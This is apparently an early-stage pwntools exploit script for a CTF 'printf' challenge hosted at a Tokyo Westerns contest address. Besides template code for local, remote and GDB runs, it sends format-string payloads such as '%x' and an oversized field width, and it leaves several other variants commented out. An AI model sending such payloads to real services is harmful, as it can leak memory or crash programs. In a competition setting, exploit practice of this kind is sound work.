#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('printf')

host = args.HOST or 'printf.chal.ctf.westerns.tokyo'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *93824992236398
break *93824992242012
#break *0x5555555554a5
#break *0x555555555d79

break *0x555555555c85
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

_sndla('?', '%x')
_sndla('comment?', '%18446744073709551615d')
#_sndla('?', "%1111111d")
#_sndla('?', "%s%" + "1" * (0x100 - 5) + "x")
#_sndla('?', '%111111111x')

io.interactive()

